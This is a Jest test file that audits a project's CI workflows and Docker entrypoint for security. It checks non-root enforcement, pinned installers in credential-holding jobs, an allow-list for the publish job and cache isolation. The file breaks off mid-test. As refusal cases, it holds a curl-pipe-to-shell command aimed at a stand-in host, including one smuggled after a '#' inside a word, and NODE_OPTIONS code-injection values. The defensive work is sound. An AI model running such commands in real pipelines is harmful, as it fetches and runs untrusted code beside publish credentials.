import * as fs from 'fs';
import * as path from 'path';
import * as yaml from 'js-yaml';
import { executableLines } from './workflow-lines';

/**
 * The published image has no `USER` directive by design: docker-entrypoint.sh starts as root to fix
 * named-volume ownership and then drops via `exec gosu openwa`. That drop is the only thing keeping
 * an internet-facing Node process (and its Chromium subprocess) off uid 0, and
 * `scripts/smoke-test-non-root.sh` is the only check of it.
 *
 * The script existed but no workflow ran it — its sole appearance in ci.yml was inside a comment
 * explaining why shellcheck names it. A change that left the process as root therefore passed lint,
 * every test job, the multi-arch build, the boot smoke and the image scan, and was promoted to
 * `latest`. These pin that the script is INVOKED, because a mention is not a gate.
 */

const workflowDir = path.join(__dirname, '..', '..', '.github', 'workflows');

type Step = { name?: string; run?: string; uses?: string; with?: unknown; env?: unknown };
type Workflow = { jobs?: Record<string, { steps?: Step[] }> };

function workflowOf(file: string): Workflow {
  return yaml.load(fs.readFileSync(path.join(workflowDir, file), 'utf8')) as Workflow;
}

function runCommandsOf(file: string): string[] {
  return Object.values(workflowOf(file).jobs ?? {}).flatMap(job =>
    (job.steps ?? []).map(step => executableLines(step.run ?? '')),
  );
}

/**
 * Jobs that execute a repo-relative path, paired with whether the job ever checks the repo out.
 *
 * Both spellings count: `./scripts/x.sh` and the bare `scripts/x.sh` an interpreter is handed
 * (`bash scripts/x.sh`). Matching only the dotted form would leave the gate blind to the other way
 * of writing the very call it exists to protect.
 */
function jobsRunningRepoScripts(file: string): Array<{ job: string; scripts: string[]; hasCheckout: boolean }> {
  const REPO_PATH = /(?:^|[\s'"])(\.\/[\w./-]+|(?:scripts|bin|tools)\/[\w./-]+)/g;
  return Object.entries(workflowOf(file).jobs ?? {})
    .map(([job, def]) => {
      const steps = def.steps ?? [];
      const scripts = steps.flatMap(step => [...(step.run ?? '').matchAll(REPO_PATH)].map(m => m[1]));
      return { job, scripts, hasCheckout: steps.some(step => (step.uses ?? '').startsWith('actions/checkout')) };
    })
    .filter(entry => entry.scripts.length > 0);
}

describe('the non-root drop is enforced, not merely documented', () => {
  // A `run:` extractor that silently matched nothing would make every assertion below vacuously
  // pass. Anchor it on a script the workflows have always invoked.
  it('extracts run commands from the workflows', () => {
    expect(runCommandsOf('ci.yml').join('\n')).toContain('smoke-test-backup-restore.sh');
  });

  // The extractor's own defect, pinned: a mention is not an invocation. Disabling a step by commenting
  // it out is the exact shape that let the script go unrun while this file reported it enforced.
  it('does not count a commented-out invocation as running the script', () => {
    expect(executableLines('# ./scripts/smoke-test-non-root.sh\necho skipped')).not.toContain('smoke-test-non-root.sh');
    expect(executableLines('  OPENWA_SMOKE_IMAGE="$IMAGE" ./scripts/smoke-test-non-root.sh # run it')).toContain(
      'smoke-test-non-root.sh',
    );
    // A '#' inside a quoted string is data; truncating there would drop a real command.
    expect(executableLines('echo "tag #1" && ./scripts/smoke-test-non-root.sh')).toContain('smoke-test-non-root.sh');
    // A '#' inside a word is not a comment: the shell runs what follows it.
    expect(executableLines('npm --version#; ./scripts/smoke-test-non-root.sh')).toContain('smoke-test-non-root.sh');
    expect(executableLines('echo "${#list[@]}" $# ./scripts/smoke-test-non-root.sh')).toContain(
      'smoke-test-non-root.sh',
    );
  });

  // BOTH paths. The tag path is the one that promotes to `latest`, so a check present only on the PR
  // path leaves the publishing route unguarded — the asymmetry this workflow's own audit step forbids.
  it.each(['ci.yml', 'release.yml'])('invokes the non-root smoke test from %s', file => {
    const invocations = runCommandsOf(file).filter(run => run.includes('smoke-test-non-root.sh'));
    expect(invocations.length).toBeGreaterThan(0);
  });

  // The Dockerfile relies on the entrypoint's gosu drop rather than a USER directive. If that ever
  // changes to a real USER line the smoke test still passes, but this records WHY the directive is
  // absent, so its absence is never read as an oversight and "fixed" by deleting the drop.
  it('keeps the entrypoint gosu drop the image depends on', () => {
    const entrypoint = fs.readFileSync(path.join(__dirname, '..', '..', 'docker-entrypoint.sh'), 'utf8');
    expect(entrypoint).toMatch(/exec\s+gosu\s+openwa/);
  });

  // A start as any other uid (runAsUser, `--user`) holds no CAP_CHOWN or CAP_SETUID, so it must leave
  // before the first chown and the gosu drop: under `set -e` either one exits, and the container
  // restarts in a loop. It must also refuse a data volume it cannot write, naming the cause.
  it('lets a non-root start skip every chown and the gosu drop', () => {
    const entrypoint = fs.readFileSync(path.join(__dirname, '..', '..', 'docker-entrypoint.sh'), 'utf8');
    const exit = entrypoint.search(/^if \[ "\$\(id -u\)" != 0 \]; then\n\s+exec "\$@"\nfi$/m);
    const firstChown = entrypoint.search(/^\s*(?:chown|find\b.*-exec chown)\b/m);
    expect(exit).toBeGreaterThan(-1);
    expect(firstChown).toBeGreaterThan(exit);
    expect(entrypoint.search(/^exec gosu openwa/m)).toBeGreaterThan(exit);
    expect(entrypoint).toMatch(/FATAL: \$dir is not writable by uid/);
  });

  // runAsUser, fsGroup and `--user` name a number, so the image has to guarantee it rather than take
  // whatever `useradd -r` finds free after the apt layers.
  it('pins the openwa uid and gid that the chart and docs name', () => {
    const dockerfile = fs.readFileSync(path.join(__dirname, '..', '..', 'Dockerfile'), 'utf8');
    const values = fs.readFileSync(path.join(__dirname, '..', '..', 'charts', 'openwa', 'values.yaml'), 'utf8');
    expect(dockerfile).toMatch(/^RUN groupadd -r -g 997 openwa && useradd -r -u 997 -g openwa openwa$/m);
    expect(values).toMatch(/runAsUser: 997/);
    expect(values).toMatch(/fsGroup: 997/);
  });

  // The Dockerfile explains the missing USER directive by pointing at the entrypoint. A line number
  // goes stale on the next entrypoint edit and sends the reader to the wrong statement.
  it('does not cite entrypoint line numbers from the Dockerfile', () => {
    const dockerfile = fs.readFileSync(path.join(__dirname, '..', '..', 'Dockerfile'), 'utf8');
    expect(dockerfile).toContain('docker-entrypoint.sh ends with');
    expect(dockerfile).not.toMatch(/docker-entrypoint\.sh:\d/);
    expect(dockerfile).not.toMatch(/chowns? on lines? \d/);
  });

  // Chromium's Singleton* locks, a relocated session profile and a backup staging copy are all
  // symlinks under /app/data. A bind mount that refuses to chown a symlink (Docker Desktop file
  // sharing) failed a recursive chown under `set -e` and crash-looped the container (#1722), and a
  // lock cleanup can only cover the default path. The ownership fix itself has to skip links.
  // `-h` too: find tests the type before the batched chown runs, so without it a path replaced by a
  // link in between would have root re-own the link's target. Only wrong-owned paths are chowned: a
  // chown is a metadata write even when nothing changes, so re-owning the whole volume on every start
  // held boot for minutes on a large one. The ownership test is parenthesised so `! -type l` still
  // governs both of its branches.
  it('re-owns only wrong-owned paths under /app/data, never symlinks', () => {
    const entrypoint = fs.readFileSync(path.join(__dirname, '..', '..', 'docker-entrypoint.sh'), 'utf8');
    const cleanup = entrypoint.search(/^rm -f \/app\/data\/sessions\/\*\/Singleton\*/m);
    const chown = entrypoint.search(
      /^find \/app\/data ! -type l \\\( ! -user openwa -o ! -group openwa \\\) -exec chown -h openwa:openwa \{\} \+$/m,
    );
    expect(entrypoint).not.toMatch(/^\s*chown\s+-R\b.*\/app\/data/m);
    // Swallowing the failure would hide a real refusal (NFS root_squash, SELinux).
    expect(entrypoint).not.toMatch(/-exec chown[^\n]*\|\|/);
    expect(cleanup).toBeGreaterThan(-1);
    expect(chown).toBeGreaterThan(-1);
    expect(cleanup).toBeLessThan(chown);
  });
});

/**
 * Invoking the script is not the same as being able to run it. `boot-smoke` in release.yml called
 * `./scripts/smoke-test-non-root.sh` from a job that never checks the repo out — the file is simply
 * absent from the workspace, so the step exits 127 and the ONLY path that publishes `latest` fails
 * at every tag. Fail-closed, but the release path was broken rather than guarded.
 *
 * The gate above could not see it: it binds the text of `run:`, and the text was correct. This binds
 * the precondition instead, for every job in every workflow — a repo-relative command needs the repo.
 */
describe('a job that runs a repo script checks the repo out', () => {
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));

  // Non-vacuity control: the finder must actually see jobs, or every assertion below passes on an
  // empty set. Anchor on a workflow known to run repo scripts.
  it('finds jobs that run repo-relative scripts', () => {
    expect(workflows.length).toBeGreaterThan(0);
    const all = workflows.flatMap(f => jobsRunningRepoScripts(f));
    expect(all.length).toBeGreaterThan(0);
    expect(all.some(e => e.scripts.some(s => s.includes('scripts/')))).toBe(true);
  });

  it.each(workflows)('%s: every job running ./… also runs actions/checkout', file => {
    const offenders = jobsRunningRepoScripts(file)
      .filter(entry => !entry.hasCheckout)
      .map(entry => `${entry.job} runs ${entry.scripts.join(', ')} without actions/checkout`);
    expect(offenders).toEqual([]);
  });
});

/**
 * A job granted `id-token: write` can mint a registry publish credential, so every tool it installs
 * runs with that ability. A floating spec (`npm@latest`, a bare major) resolves to whatever was
 * published most recently at tag time; pin the exact version the way the Dockerfile pins its npm.
 *
 * Python installs cannot be pinned that way: `pip install` resolves the ranges in pyproject.toml, and
 * `python -m build` fetches its build backend into an isolated environment no pin reaches. The same
 * holds for pipx, uv, uvx, poetry, pdm, hatch, flit and pyproject-build. So an id-token job runs none of them; the
 * install, test and build happen in a job without the grant.
 *
 * Those two families are checked in every workflow. Any other installer (npx, a local npm install, gem,
 * go) in the id-token job of another workflow is not caught here; the JavaScript SDK's publish job, the
 * one such job there is, is held to an allow-list of its commands, actions and keys further down.
 */
describe('a job that can mint a publish credential pins global npm installs and runs no Python installer', () => {
  type Permissions = Record<string, string> | string | null | undefined;
  type OidcJob = { permissions?: Permissions; steps?: Step[]; [key: string]: unknown };
  type OidcWorkflow = { permissions?: Permissions; jobs?: Record<string, OidcJob>; [key: string]: unknown };
  const workflows = fs.readdirSync(workflowDir).filter(f => f.endsWith('.yml') || f.endsWith('.yaml'));
  // Options before a subcommand, each optionally followed by one value (`--prefix /usr/local`).
  const OPTS = String.raw`(?:[ \t]+-\S+(?:[ \t]+[^\s-]\S*)?)*`;
  // Options may sit before the subcommand or anywhere after it: group 1 holds the leading ones, group 2
  // the rest of the command, and the global flag may be in either.
  const NPM_INSTALL = new RegExp(String.raw`\bnpm(${OPTS})[ \t]+(?:install|i|add)\b([^\n;&|]*)`, 'g');
  const GLOBAL_FLAG = /(?:^|\s)(?:-g|--global|--location[= \t]global)(?=\s|$)/;
  // `pip`, `pip3`, `python -m pip` and `uv pip` all contain `pip install`; every tool may take options
  // before its subcommand (`uv --directory sdk/python build`).
  const PYTHON_INSTALL = new RegExp(
    [
      String.raw`\bpip[\d.]*${OPTS}[ \t]+(?:install|wheel|download)\b`,
      String.raw`\bpython[\d.]*${OPTS}[ \t]+-m[ \t]*build\b`,
      String.raw`\bpyproject-build\b`,
      String.raw`\buvx\b`,
      String.raw`\bpipx${OPTS}[ \t]+(?:install|run)\b`,
      String.raw`\buv${OPTS}[ \t]+(?:sync|build|run|add|tool)\b`,
      String.raw`\bpoetry${OPTS}[ \t]+(?:install|sync|update|lock|build|add|publish)\b`,
      String.raw`\bpdm${OPTS}[ \t]+(?:install|sync|update|add|build|publish)\b`,
      String.raw`\bhatch${OPTS}[ \t]+(?:build|publish|run|env)\b`,
      String.raw`\bflit${OPTS}[ \t]+(?:build|publish|install)\b`,
    ].join('|'),
    'g',
  );

  // A job without its own `permissions` inherits the workflow-level block; `write-all` grants id-token too.
  const grantsIdToken = (perms: Permissions): boolean =>
    perms === 'write-all' || (typeof perms === 'object' && perms !== null && perms['id-token'] === 'write');

  const loadOidcWorkflow = (source: string | OidcWorkflow): OidcWorkflow =>
    typeof source === 'string'
      ? (yaml.load(fs.readFileSync(path.join(workflowDir, source), 'utf8')) as OidcWorkflow)
      : source;

  const oidcJobs = (source: string | OidcWorkflow): Array<[string, OidcJob]> => {
    const workflow = loadOidcWorkflow(source);
    return Object.entries(workflow.jobs ?? {}).filter(([, def]) =>
      grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions),
    );
  };

  const oidcJobSteps = (source: string | OidcWorkflow): Array<{ job: string; step: Step }> =>
    oidcJobs(source).flatMap(([job, def]) => (def.steps ?? []).map(step => ({ job, step })));

  const oidcJobRuns = (source: string | OidcWorkflow): Array<{ job: string; run: string }> =>
    oidcJobSteps(source).map(({ job, step }) => ({ job, run: executableLines(step.run ?? '') }));

  const globalInstallsInOidcJobs = (source: string | OidcWorkflow): Array<{ job: string; spec: string }> =>
    oidcJobRuns(source).flatMap(({ job, run }) =>
      [...run.matchAll(NPM_INSTALL)]
        .filter(match => GLOBAL_FLAG.test(`${match[1]} ${match[2]}`))
        .flatMap(match =>
          match[2]
            // `--location global` carries its value as a separate word, which is not a package spec.
            .replace(/--location[ \t]+global\b/g, '--location=global')
            .trim()
            .split(/\s+/)
            .filter(arg => !arg.startsWith('-'))
            .map(spec => ({ job, spec })),
        ),
    );

  const pythonInstallsInOidcJobs = (source: string | OidcWorkflow): string[] =>
    oidcJobRuns(source).flatMap(({ job, run }) => [...run.matchAll(PYTHON_INSTALL)].map(m => `${job}: ${m[0]}`));

  // Non-vacuity: the JS SDK release job installs its own npm, so the finder must see it.
  it('finds the global npm install in the JS SDK publish job', () => {
    expect(globalInstallsInOidcJobs('js-sdk-release.yml').map(entry => entry.spec)).toEqual([
      expect.stringMatching(/^npm@/),
    ]);
  });

  it('treats a job that inherits id-token: write or write-all from the workflow as able to mint', () => {
    const job = { steps: [{ run: 'npm install -g npm@latest' }] };
    expect(globalInstallsInOidcJobs({ permissions: { 'id-token': 'write' }, jobs: { publish: job } })).toHaveLength(1);
    expect(globalInstallsInOidcJobs({ permissions: 'write-all', jobs: { publish: job } })).toHaveLength(1);
    expect(globalInstallsInOidcJobs({ jobs: { publish: { ...job, permissions: 'write-all' } } })).toHaveLength(1);
    // A job-level block replaces the workflow-level one, so it can also withdraw the grant.
    expect(
      globalInstallsInOidcJobs({ permissions: 'write-all', jobs: { publish: { ...job, permissions: {} } } }),
    ).toHaveLength(0);
  });

  it('finds a global npm install whatever the order of its flags', () => {
    const commands = [
      'npm install npm@latest --global',
      'npm -g install npm@latest',
      'npm install --no-fund -g npm@latest',
      'npm i npm@11 -g',
      'npm add --location=global npm@latest',
      'npm --prefix /usr/local install -g npm@latest',
      'npm --location global install npm@latest',
      'npm install --location global npm@11.2.0',
    ];
    const job: OidcWorkflow = {
      jobs: { publish: { permissions: { 'id-token': 'write' }, steps: commands.map(run => ({ run })) } },
    };
    expect(globalInstallsInOidcJobs(job).map(entry => entry.spec)).toEqual([
      'npm@latest',
      'npm@latest',
      'npm@latest',
      'npm@11',
      'npm@latest',
      'npm@latest',
      'npm@latest',
      'npm@11.2.0',
    ]);
    // A local install and a clean install grant nothing global.
    const local: OidcWorkflow = {
      jobs: {
        publish: { permissions: { 'id-token': 'write' }, steps: [{ run: 'npm ci\nnpm install --no-save foo' }] },
      },
    };
    expect(globalInstallsInOidcJobs(local)).toEqual([]);
  });

  it.each(workflows)('%s: global installs in id-token jobs are pinned to an exact version', file => {
    const floating = globalInstallsInOidcJobs(file).filter(entry => !/@\d+\.\d+\.\d+$/.test(entry.spec));
    expect(floating).toEqual([]);
  });

  // Non-vacuity: the single-job shape the PyPI release used to have, and the Python install that
  // still exists in the release workflow, just outside the id-token job.
  it('finds pip installs and python -m build in an id-token job', () => {
    const singleJob: OidcWorkflow = {
      jobs: {
        publish: {
          permissions: { contents: 'read', 'id-token': 'write' },
          steps: [
            { run: "pip install -e '.[dev]'\npytest" },
            { run: 'python -m pip install --upgrade build\npython -m build' },
          ],
        },
      },
    };
    expect(pythonInstallsInOidcJobs(singleJob)).toEqual([
      'publish: pip install',
      'publish: pip install',
      'publish: python -m build',
    ]);
    expect(runCommandsOf('python-sdk-release.yml').join('\n')).toMatch(PYTHON_INSTALL);
  });

  it('finds the other Python installers and build frontends in an id-token job', () => {
    const commands = [
      'pipx install twine',
      'pipx run build',
      'uvx twine upload dist/*',
      'uv sync',
      'uv build',
      'uv tool install twine',
      'poetry install',
      'poetry build',
      'poetry sync',
      'poetry update',
      'poetry publish --build',
      'pdm install',
      'hatch build',
      'flit publish',
      'pyproject-build',
      'python -m pip wheel .',
      'pip -q install twine',
      'python -m pip --quiet install build',
      'poetry --no-interaction publish --build',
      'poetry -C sdk/python build',
      'uv --directory sdk/python build',
      'uv -q sync',
      'pdm -p sdk/python build',
      'hatch -e default build',
      'pipx --verbose run build',
      'python -I -m build',
      'python -W ignore -m build',
      'pip --cache-dir /tmp/x install twine',
    ];
    const job: OidcWorkflow = {
      jobs: { publish: { permissions: { 'id-token': 'write' }, steps: commands.map(run => ({ run })) } },
    };
    expect(pythonInstallsInOidcJobs(job)).toHaveLength(commands.length);
  });

  it.each(workflows)('%s: id-token jobs run no Python installer or build frontend', file => {
    expect(pythonInstallsInOidcJobs(file)).toEqual([]);
  });

  // The JavaScript SDK's toolchain (the install, the test runner, the compiler that builds dist/) is
  // third-party code as well. Its publish job uploads the tarball the build job made and tested, and
  // runs nothing but the pinned npm that publishes it. An allow-list, not a list of what to avoid: the
  // job's whole command set is three lines, and any other command (a local install, node, another
  // package manager, a script of the repository) or action is new code running beside the credential.
  const PUBLISH_COMMANDS = [
    /^npm install -g npm@\d+\.\d+\.\d+$/,
    /^npm --version$/,
    /^npm publish "\$GITHUB_WORKSPACE"\/package\/\*\.tgz --access public --ignore-scripts$/,
  ];
  const PUBLISH_ACTIONS = /^actions\/(?:setup-node|download-artifact)@[0-9a-f]{40}$/;
  // Beyond the lines it runs: a step key that injects code or changes what it runs under (env, shell,
  // working-directory), an input the two actions do not need, and a job or workflow key that does the same
  // for every step. Anything not named here has to be added on purpose.
  const PUBLISH_STEP_KEYS = new Set(['name', 'uses', 'run', 'with']);
  const PUBLISH_WITH_KEYS = new Set(['node-version', 'name', 'path']);
  const PUBLISH_JOB_KEYS = new Set(['needs', 'runs-on', 'timeout-minutes', 'permissions', 'steps']);

  const outsideAllowList = (source: string | OidcWorkflow): string[] => {
    const jobs = oidcJobs(source);
    if (jobs.length === 0) return [];
    const workflow = loadOidcWorkflow(source);
    const found = ['env', 'defaults'].filter(key => workflow[key] !== undefined).map(key => `workflow: ${key}`);
    for (const [job, def] of jobs) {
      for (const key of Object.keys(def)) if (!PUBLISH_JOB_KEYS.has(key)) found.push(`${job}: job key ${key}`);
      for (const step of def.steps ?? []) {
        for (const key of Object.keys(step)) if (!PUBLISH_STEP_KEYS.has(key)) found.push(`${job}: step key ${key}`);
        if (step.uses && !PUBLISH_ACTIONS.test(step.uses)) found.push(`${job}: uses ${step.uses}`);
        for (const key of Object.keys(step.with ?? {})) {
          if (!PUBLISH_WITH_KEYS.has(key)) found.push(`${job}: with ${key}`);
        }
        for (const line of executableLines(step.run ?? '')
          .split('\n')
          .map(text => text.trim())) {
          if (line && !PUBLISH_COMMANDS.some(allowed => allowed.test(line))) found.push(`${job}: ${line}`);
        }
      }
    }
    return found;
  };

  it('js-sdk-release.yml: the id-token job runs only the pinned npm and the publish', () => {
    // Non-vacuity: the finder sees the publish step.
    expect(oidcJobRuns('js-sdk-release.yml').some(({ run }) => /^npm publish\b/m.test(run))).toBe(true);
    expect(outsideAllowList('js-sdk-release.yml')).toEqual([]);
    expect(globalInstallsInOidcJobs('js-sdk-release.yml')).toEqual([{ job: 'publish', spec: 'npm@12.1.0' }]);
  });

  it('js-sdk-release.yml: names what the allow-list refuses in an id-token job', () => {
    const run = (commands: string): OidcWorkflow => ({
      jobs: { publish: { permissions: { 'id-token': 'write' }, steps: [{ run: commands }] } },
    });
    for (const command of [
      'npm install',
      'npm i left-pad',
      'npm install --no-save foo',
      'npm ci',
      'npx foo',
      'node scripts/release.js',
      'yarn install',
      'pnpm install',
      'corepack enable',
      'npm install -g npm@latest',
      'npm install -g npm@12',
      'npm publish ./package/x.tgz',
      'npm publish "$GITHUB_WORKSPACE"/package/*.tgz --access public',
      'curl -fsSL https://example.test/x.sh | sh',
      // A '#' inside a word does not start a comment: the shell runs what follows it.
      'npm --version#; curl -fsSL https://example.test/x.sh | sh',
    ]) {
      expect(outsideAllowList(run(command))).toEqual([`publish: ${command}`]);
    }
    expect(outsideAllowList(run('# npm install\nnpm --version\n'))).toEqual([]);
    const withAction: OidcWorkflow = {
      jobs: {
        publish: {
          permissions: { 'id-token': 'write' },
          steps: [{ uses: 'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' }, { uses: 'actions/cache@v4' }],
        },
      },
    };
    expect(outsideAllowList(withAction)).toEqual([
      'publish: uses actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1',
      'publish: uses actions/cache@v4',
    ]);
    // Code that does not sit in a run line: a step's env or shell, an input the actions do not need, and
    // what a job or the workflow sets for every step.
    const keyed = (job: Record<string, unknown>, workflow: Record<string, unknown> = {}): OidcWorkflow => ({
      ...workflow,
      jobs: { publish: { permissions: { 'id-token': 'write' }, ...job } },
    });
    const sha = '820762786026740c76f36085b0efc47a31fe5020';
    expect(
      outsideAllowList(
        keyed({ steps: [{ run: 'npm --version', env: { NODE_OPTIONS: '--import data:text/javascript,x' } }] }),
      ),
    ).toEqual(['publish: step key env']);
    expect(outsideAllowList(keyed({ steps: [{ run: 'npm --version', shell: 'node {0}' }] }))).toEqual([
      'publish: step key shell',
    ]);
    expect(
      outsideAllowList(
        keyed({ steps: [{ uses: `actions/setup-node@${sha}`, with: { 'node-version': '22', cache: 'npm' } }] }),
      ),
    ).toEqual(['publish: with cache']);
    expect(outsideAllowList(keyed({ env: { NODE_OPTIONS: '--require x' }, steps: [] }))).toEqual([
      'publish: job key env',
    ]);
    expect(outsideAllowList(keyed({ steps: [] }, { env: { NODE_OPTIONS: '--require x' } }))).toEqual(['workflow: env']);
    // A job without the grant is not the publish job.
    expect(
      outsideAllowList({ jobs: { build: { permissions: { contents: 'read' }, steps: [{ run: 'npm ci' }] } } }),
    ).toEqual([]);
  });

  // npm reads `dir/file.tgz` as the GitHub shorthand user/repo (hosted-git-info is tried before the file
  // check), and the pinned npm refuses git specs by default, so a tarball is named by an absolute path.
  it('js-sdk-release.yml: the publish step names the tarball in a form npm reads as a file', () => {
    const runs = oidcJobRuns('js-sdk-release.yml')
      .map(({ run }) => run)
      .join('\n');
    const target = /\bnpm publish\s+(?:-\S+\s+)*(\S+)/.exec(runs)?.[1] ?? '';
    expect(target).toMatch(/^(?:"?\$\{?GITHUB_WORKSPACE\}?"?|)\/[^\s]*\.tgz$/);
  });

  // The caches a setup action restores are written by jobs that run third-party test code. A job that
  // holds a publish credential executes what it restores, with that credential in its environment. A job
  // holds one when it can mint a token, or passes a secret other than the run's own token as a step input,
  // an environment value or in a command line, or carries one in its own environment.
  const SECRET_REF = /\bsecrets(?:\.(?!GITHUB_TOKEN\b)|\s*\[|\s*\))/;
  const cachesBesideCredential = (workflow: OidcWorkflow): string[] => {
    const holdsCredential = (def: OidcJob): boolean =>
      grantsIdToken(def.permissions !== undefined ? def.permissions : workflow.permissions) ||
      SECRET_REF.test(JSON.stringify(workflow.env ?? {})) ||
      SECRET_REF.test(JSON.stringify(def.env ?? {})) ||
      (def.steps ?? []).some(step => SECRET_REF.test(JSON.stringify([step.env, step.with, step.run])));
    return Object.entries(workflow.jobs ?? {})
      .filter(([, def]) => holdsCredential(def))
      .flatMap(([job, def]) =>
        (def.steps ?? [])
          .filter(step => {
            const inputs = (step.with ?? {}) as Record<string, unknown>;
            return (step.uses ?? '').startsWith('actions/cache') || inputs.cache !== undefined;
          })
          .map(step => `${job}: ${step.uses ?? step.name ?? 'step'} restores a cache`),
      );
  };

  it.each(workflows.filter(file => /-sdk-release\.yml$/.test(file)))(
    '%s: a job that holds a publish credential restores no cache',
    file => {
      expect(cachesBesideCredential(loadOidcWorkflow(file))).toEqual([]);
    },
  );

  // -DskipTests only skips running the tests: the test sources are still compiled against every test
  // dependency, and javac runs the annotation processors it finds on that classpath beside the credentials.
  it('java-sdk-release.yml: the deploy compiles no test sources', () => {
    const workflow = workflowOf('java-sdk-release.yml');
    const runs = Object.values(workflow.jobs ?? {})
      .flatMap(job => job.steps ?? [])
      .map(step => executableLines(step.run ?? ''))
      .join('\n');
    const deploy = runs.split('\n').filter(line => /\bmvn\b.*\bdeploy\b/.test(line));
    expect(deploy.length).toBeGreaterThan(0);
    for (const line of deploy) {
      expect(line).toContain('-Dmaven.test.skip=true');
      expect(line).not.toContain('-DskipTests');
    }
  });

  it('finds a cache restored beside a publish credential', () => {
    const withSecret = (job: Record<string, unknown>): OidcWorkflow => ({ jobs: { publish: job } });
    const setupJava = {
      uses: 'actions/setup-java@v6',
      with: { cache: 'maven', 'gpg-private-key': '${{ secrets.GPG_KEY }}' },
    };
    expect(cachesBesideCredential(withSecret({ steps: [setupJava] }))).toEqual([
      'publish: actions/setup-java@v6 restores a cache',
    ]);
    // The credential may reach the job through its environment or a command line, not only a step input.
    const cacheOnly = { uses: 'actions/setup-node@v6', with: { cache: 'npm' } };
    expect(
      cachesBesideCredential(withSecret({ env: { TOKEN: '${{ secrets.NPM_TOKEN }}' }, steps: [cacheOnly] })),
    ).toEqual(['publish: actions/setup-node@v6 restores a cache']);
    expect(
      cachesBesideCredential(withSecret({ steps: [cacheOnly, { run: 'deploy --token ${{ secrets.DEPLOY_TOKEN }}' }] })),
    ).toEqual(['publish: actions/setup-node@v6 restores a cache']);
    // A job that holds nothing may restore one, and the run's own token is not a publish credential.
    expect(cachesBesideCredential(withSecret({ steps: [cacheOnly] }))).toEqual([]);
    expect(
      cachesBesideCredential(
        withSecret({ steps: [{ ...cacheOnly, env: { GH_TOKEN: '${{ secrets.GITHUB_TOKEN }}' } }] }),
      ),
    ).toEqual([]);
    expect(
      cachesBesideCredential({
        permissions: { 'id-token': 'write' },
        jobs: { publish: { steps: [{ uses: 'actions/cache@v4' }] } },
      }),
    ).toEqual(['publish: actions/cache@v4 restores a cache']);
  });
});

/**
 * The operator-facing text around the entrypoint, the probes and the backup scripts states what they
 * do. Each of these was once true of an earlier version and outlived the change that made it false.
 */
describe('deployment docs describe what the entrypoint, probes and backup scripts do', () => {
  const root = path.join(__dirname, '..', '..');
  const read = (file: string): string => fs.readFileSync(path.join(root, file), 'utf8');

  // A non-root start leaves before the re-own, so there a host chown is the fix, not a no-op.
  it('scopes "a host chown is not a fix" to the root start', () => {
    const bullet = read('docs/12-troubleshooting-faq.md')
      .split('\n')
      .find(line => line.includes('of the host directory is not a fix'));
    expect(bullet).toMatch(/root start/);
  });

  // A non-root start never re-owns what the restore writes, and a root helper pod is refused in a
  // namespace enforcing Pod Security "restricted". The helper runs as the app user, so both hold.
  it('runs the Helm restore helper as the app user, and scopes the compose re-own to the root start', () => {
    const doc = read('docs/11-operational-runbooks.md');
    const helper = doc.slice(
      doc.indexOf('  name: openwa-restore'),
      doc.indexOf('> EOF', doc.indexOf('  name: openwa-restore')),
    );
    expect(helper).toMatch(/runAsNonRoot: true/);
    expect(helper).toMatch(/runAsUser: 997/);
    expect(helper).toMatch(/fsGroup: 997/);
    expect(helper).toMatch(/seccompProfile: \{ type: RuntimeDefault \}/);
    expect(helper).toMatch(/allowPrivilegeEscalation: false/);
    expect(helper).toMatch(/capabilities: \{ drop: \[ALL\] \}/);
    const handBack = doc
      .replace(/\n> # /g, ' ')
      .split(/[.;] /)
      .find(sentence => sentence.includes('hands the restored files back'));
    expect(handBack).toMatch(/root start/);
  });

  // Session auto-start is detached: boot does not wait for it, so no probe covers it.
  it('does not claim the startupProbe covers session restore', () => {
    expect(read('docs/13-horizontal-scaling.md')).not.toMatch(/off during boot \([^)]*session/);
    expect(read('scripts/check-chart-behaviour.mjs')).not.toMatch(/sessions to restore/);
  });

  // The chart's liveness budget lives in statefulset.yaml; a copied figure goes stale.
  it('does not restate the chart liveness budget in session comments', () => {
    for (const file of ['src/modules/session/session.service.ts', 'src/modules/session/session.service.spec.ts']) {
      expect(read(file)).not.toMatch(/the chart's (?:budget )?is ~\d+s/);
    }
  });

  // The startupProbe suspends liveness until it first succeeds, so a closed port at boot meets it, not liveness.
  it('names the startupProbe as the budget a closed port at boot runs against', () => {
    for (const file of ['src/modules/session/session.service.ts', 'src/modules/session/session.service.spec.ts']) {
      const text = read(file).replace(/\n\s*\/\/ ?/g, ' ');
      expect(text).not.toMatch(/every liveness\s+probe/i);
      expect(text).not.toMatch(/the chart's liveness budget/);
      expect(text).toMatch(/the chart's startupProbe budget/);
    }
  });

  // The note is written for any archive holding engine state, including one taken with sessions stopped.
  it('words the ENGINE-STATE-NOTE as a possibility in the restore.sh header', () => {
    const phrase = 'ENGINE-STATE-NOTE (engine auth state that may have been copied while the app ran)';
    const header = read('scripts/restore.sh')
      .split('\n')
      .filter(line => line.startsWith('#'))
      .map(line => line.replace(/^#\s*/, ''))
      .join(' ');
    expect(header).toContain(phrase);
    expect(read('docs/11-operational-runbooks.md')).toContain(phrase);
  });
});

/**
 * `ghcr.io/<repo>:main` is the channel an operator pulls to track main. Two things once decided which
 * commit it pointed at: whichever push run finished its build last, even an older commit's, and a push
 * that happened before the non-root smoke test, so an image that failed the smoke had already moved it.
 * The branch tag is now a final step that runs only after the smoke passes and only while the commit is
 * still the branch head; the build itself publishes nothing but the immutable `:<sha>` tag.
 */
describe('ci.yml moves the branch image tag only for the tested branch head', () => {
  type CiStep = Step & { if?: string; id?: string };
  type CiWorkflow = {
    concurrency?: { group?: string; 'cancel-in-progress'?: boolean | string };
    jobs?: Record<string, { steps?: CiStep[] }>;
  };
  const ci = (): CiWorkflow => workflowOf('ci.yml');
  const dockerSteps = (): CiStep[] => ci().jobs?.docker?.steps ?? [];

  it('finds the docker job and its steps', () => {
    expect(dockerSteps().length).toBeGreaterThan(3);
  });

  // One group per pull request, so a new push cancels the superseded run; one group per push run
  // (run_id), so pushes to main are never queued behind, or cancelled by, each other.
  it('cancels superseded pull request runs without grouping push runs together', () => {
    const concurrency = ci().concurrency;
    expect(concurrency?.['cancel-in-progress']).toBe(true);
    expect(concurrency?.group).toContain('github.event.pull_request.number');
    expect(concurrency?.group).toContain('github.run_id');
